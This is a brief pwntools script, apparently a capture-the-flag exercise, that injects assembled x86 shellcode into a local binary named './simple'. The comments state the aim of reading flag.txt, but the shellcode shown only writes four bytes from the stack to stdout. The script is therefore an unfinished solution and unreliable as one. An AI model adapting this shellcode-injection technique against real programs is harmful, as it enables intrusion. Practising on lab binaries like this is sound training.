
#!/usr/bin/env python2

from pwn import *

# goal:
#   read flag.txt
#   print contents of the file

p = process('./simple')

p.recvuntil('enter your shellcode:')

# sub esp, 100 ; make room for buffer

shellcode = '''
   push esp
   mov eax, 4
   mov ebx, 1
   mov ecx, esp
   mov edx, 4
   int 0x80
'''

#print(asm(shellcode))

p.sendline(asm(shellcode))


p.interactive()
